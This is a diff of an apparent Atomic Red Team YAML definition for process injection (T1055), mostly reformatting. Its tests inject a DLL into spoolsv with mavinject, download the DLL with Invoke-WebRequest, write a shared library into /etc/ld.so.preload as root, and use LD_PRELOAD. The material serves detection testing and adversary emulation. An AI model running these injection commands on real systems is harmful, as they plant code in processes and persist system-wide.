@@ -1,112 +1,93 @@
----
-attack_technique: T1055
+attack_technique:
+- T1055
 display_name: Process Injection
-
 atomic_tests:
 - name: Process Injection via mavinject.exe
-  auto_generated_guid: 74496461-11a1-4982-b439-4d87a550d254
   description: |
     Windows 10 Utility To Inject DLLS.
 
     Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
-
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
-    dll_payload:
-      description: DLL to Inject
-      type: Path
-      default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
     process_id:
       description: PID of input_arguments
       type: Integer
       default: (get-process spoolsv).id
+    dll_payload:
+      description: DLL to Inject
+      type: Path
+      default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        Utility to inject must exist on disk at specified location (#{dll_payload})
-      prereq_command: |
-        if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
+  - description: |
+      Utility to inject must exist on disk at specified location (#{dll_payload})
+    prereq_command: |
+      if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
   executor:
-    name: powershell
-    elevation_required: true
     command: |
       $mypid = #{process_id}
       mavinject $mypid /INJECTRUNNING #{dll_payload}
-
+    name: powershell
+    elevation_required: true
 - name: Shared Library Injection via /etc/ld.so.preload
-  auto_generated_guid: 39cb0e67-dd0d-4b74-a74b-c072db7ae991
-  description: |
-    This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.
-    
-    Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
+  description: "This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. \n"
   supported_platforms:
-    - linux
+  - linux
   input_arguments:
-    path_to_shared_library:
-      description: Path to a shared library object
-      type: Path
-      default: PathToAtomicsFolder/T1055/bin/T1055.so
     path_to_shared_library_source:
       description: Path to a shared library source code
       type: Path
       default: PathToAtomicsFolder/T1055/src/Linux/T1055.c
-    tmp_folder:
-      description: Path of the temp folder
+    path_to_shared_library:
+      description: Path to a shared library object
       type: Path
-      default: /tmp/1055
+      default: PathToAtomicsFolder/T1055/bin/T1055.so
   dependency_executor_name: bash
   dependencies:
-    - description: |
-        The shared library must exist on disk at specified location (#{path_to_shared_library})
-      prereq_command: |
-        if [ -f #{path_to_shared_library ]; then exit 0; else exit 1; fi;
-      get_prereq_command: |        
-        gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}        
+  - description: |
+      The shared library must exist on disk at specified location (#{path_to_shared_library})
+    prereq_command: |
+      if [ -f #{path_to_shared_library ]; then exit 0; else exit 1; fi;
+    get_prereq_command: "gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}        \n"
   executor:
-    name: bash
-    elevation_required: true # indicates whether command must be run with admin privileges. If the elevation_required attribute is not defined, the value is assumed to be false
     command: |
       sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'
-    cleanup_command:
-      
-
+    cleanup_command: ""
+    name: bash
+    elevation_required: true
 - name: Shared Library Injection via LD_PRELOAD
-  auto_generated_guid: bc219ff7-789f-4d51-9142-ecae3397deae
   description: |
     This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.
 
     Upon successful execution, bash will utilize LD_PRELOAD to load the shared object library `/etc/ld.so.preload`. Output will be via stdout.
   supported_platforms:
-    - linux
+  - linux
   input_arguments:
-    path_to_shared_library:
-      description: Path to a shared library object
-      type: Path
-      default: PathToAtomicsFolder/T1055/bin/T1055.so
     path_to_shared_library_source:
       description: Path to a shared library source code
       type: Path
       default: PathToAtomicsFolder/T1055/src/Linux/T1055.c
+    path_to_shared_library:
+      description: Path to a shared library object
+      type: Path
+      default: PathToAtomicsFolder/T1055/bin/T1055.so
   dependency_executor_name: bash
   dependencies:
-    - description: |
-        The shared library must exist on disk at specified location (#{path_to_shared_library})
-      prereq_command: |
-        if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;
-      get_prereq_command: |        
-        gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}
+  - description: |
+      The shared library must exist on disk at specified location (#{path_to_shared_library})
+    prereq_command: |
+      if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;
+    get_prereq_command: |
+      gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}
   executor:
-    name: bash
-    elevation_required: false # indicates whether command must be run with admin privileges. If the elevation_required attribute is not defined, the value is assumed to be false
     command: |
       LD_PRELOAD=#{path_to_shared_library} ls
-
+    name: bash
 - name: Process Injection via C#
-  auto_generated_guid: 611b39b7-e243-4c81-87a4-7145a90358b1
   description: |
     Process Injection using C#
     reference: https://github.com/pwndizzle/c-sharp-memory-injection
@@ -118,13 +99,14 @@ atomic_tests:
     5. ThreadHijack
     Upon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques. Output will be via stdout.
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
     exe_binary:
       description: Output Binary
       type: Path
       default: PathToAtomicsFolder\T1055\bin\T1055.exe
   executor:
-    name: command_prompt
     command: |
       #{exe_binary}
+    name: command_prompt
+
